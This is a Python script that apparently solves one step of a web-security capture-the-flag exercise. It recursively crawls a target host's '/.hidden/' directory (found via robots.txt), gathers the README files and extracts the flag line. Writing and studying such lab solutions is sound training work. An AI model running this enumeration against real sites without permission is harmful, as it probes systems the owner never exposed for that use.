import requests
from bs4 import BeautifulSoup
import sys
import os
import re


def get_content(url, file):
	with open(file, 'a+') as f:
		for link in BeautifulSoup(requests.get(url=url).text, 'html.parser').find_all('a'):
			if link.get('href') == 'README':
				content = requests.get(url=url+'/'+link.get('href')).content.decode('utf-8').strip()
				f.write(content+'\n')
			if not link.get('href').startswith('../'):
				get_content(url+'/'+link.get('href'), file)


def get_flag(file):
	flag = None

	if os.path.isfile(file):
		with open(file) as f:
			for line in f.read().splitlines():
				if bool(re.search(r'\d', line)):
					flag = line.strip()
					with open('../flag', 'w') as f:
						f.write(flag+'\n')
					break

	return flag


def check_host_name(host_name):
	return requests.get('http://'+host_name+'/.hidden/').status_code == 200


if __name__ == "__main__":
	try:
		host_name = sys.argv[1]
		file = sys.argv[2] if len(sys.argv) == 3 else 'content.txt'

		if check_host_name(host_name):
			if not os.path.exists(file):
				get_content('http://'+host_name+'/.hidden/', file)
			print(f"06 : {get_flag(file)} - hidden folder robots http://{host_name}/.hidden/")
		else:
			raise Exception('Incorrect host name')
	except Exception as e:
		print(e.args)
